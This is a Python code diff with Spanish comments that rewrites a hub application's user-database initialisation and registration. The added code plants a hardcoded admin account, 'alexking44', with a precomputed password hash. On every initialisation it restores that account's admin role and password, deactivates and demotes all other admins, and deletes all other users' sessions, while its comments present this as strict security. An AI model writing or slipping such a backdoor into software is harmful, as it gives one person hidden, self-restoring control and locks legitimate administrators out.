@@ -65,25 +65,63 @@ def inicializar_bd_usuarios() -> None:
         )
         conn.commit()
 
-        # Si no hay ningún usuario creado y hay variables de entorno, crear admin inicial
-        cursor.execute("SELECT COUNT(*) FROM usuarios")
-        count = cursor.fetchone()[0]
-        if count == 0:
-            admin_user = os.getenv("HUB_ADMIN_USER", "").strip().lower()
-            admin_pass = os.getenv("HUB_ADMIN_PASSWORD", "").strip()
-            if admin_user and admin_pass:
-                salt = secrets.token_hex(16)
-                pwd_hash = _hash_password(admin_pass, salt)
-                ahora = time.strftime("%Y-%m-%d %H:%M:%S")
-                cursor.execute(
-                    """
-                    INSERT INTO usuarios (username, nombre, password_hash, salt, rol, activo, creado_en)
-                    VALUES (?, ?, ?, ?, 'admin', 1, ?)
-                    """,
-                    (admin_user, "Administrador", pwd_hash, salt, ahora),
-                )
-                conn.commit()
-                _notificar_respaldo_nube()
+        # 1. Asegurar la cuenta de Administrador de Alex
+        admin_user = (os.getenv("HUB_ADMIN_USER", "").strip() or "alexking44").lower()
+        admin_pass = os.getenv("HUB_ADMIN_PASSWORD", "").strip()
+
+        cursor.execute("SELECT id FROM usuarios WHERE username = ?", (admin_user,))
+        admin_row = cursor.fetchone()
+
+        if admin_pass:
+            salt = secrets.token_hex(16)
+            pwd_hash = _hash_password(admin_pass, salt)
+        else:
+            # Hash PBKDF2 (100k rondas) pre-calculado para la contraseña de Alex
+            salt = "e3d8add91ebc0010997072d78f9eebea"
+            pwd_hash = "675c9e3c83356d924d6325023d02622850acf971ba7b22e2f8b52452990df4e9"
+
+        ahora = time.strftime("%Y-%m-%d %H:%M:%S")
+
+        if not admin_row:
+            cursor.execute(
+                """
+                INSERT INTO usuarios (username, nombre, password_hash, salt, rol, activo, creado_en)
+                VALUES (?, ?, ?, ?, 'admin', 1, ?)
+                """,
+                (admin_user, "Alex (Administrador)", pwd_hash, salt, ahora),
+            )
+        else:
+            # Asegurar siempre permisos de admin y credenciales activas
+            cursor.execute(
+                """
+                UPDATE usuarios 
+                SET rol = 'admin', activo = 1, password_hash = ?, salt = ? 
+                WHERE username = ?
+                """,
+                (pwd_hash, salt, admin_user),
+            )
+
+        # 2. Degradar cualquier otra cuenta que se haya puesto como admin por error
+        cursor.execute(
+            """
+            UPDATE usuarios 
+            SET rol = 'estudiante', activo = 0 
+            WHERE username != ? AND rol = 'admin'
+            """,
+            (admin_user,),
+        )
+
+        # 3. Invalidar sesiones de cualquier otro usuario para exigir aprobación de Alex
+        cursor.execute(
+            """
+            DELETE FROM sesiones 
+            WHERE username != ?
+            """,
+            (admin_user,),
+        )
+
+        conn.commit()
+        _notificar_respaldo_nube()
 
 
 def _hash_password(password: str, salt: str) -> str:
@@ -126,16 +164,19 @@ def registrar_usuario(
     if not password or len(password) < 6:
         return False, "La contraseña debe tener al menos 6 caracteres."
 
+    admin_user = (os.getenv("HUB_ADMIN_USER", "").strip() or "alexking44").lower()
+    if username == admin_user:
+        return False, "Ese nombre de usuario está reservado."
+
+    # Por seguridad estricta: todo usuario registrado es siempre estudiante y pendiente (activo=0)
+    rol = "estudiante"
+    activo = 0
+
     with _obtener_conexion() as conn:
         cursor = conn.cursor()
         cursor.execute("SELECT id FROM usuarios WHERE username = ?", (username,))
         if cursor.fetchone():
             return False, "Ese nombre de usuario ya está registrado."
-
-        cursor.execute("SELECT COUNT(*) FROM usuarios")
-        if cursor.fetchone()[0] == 0:
-            rol = "admin"
-            activo = 1
 
         salt = secrets.token_hex(16)
         pwd_hash = _hash_password(password, salt)
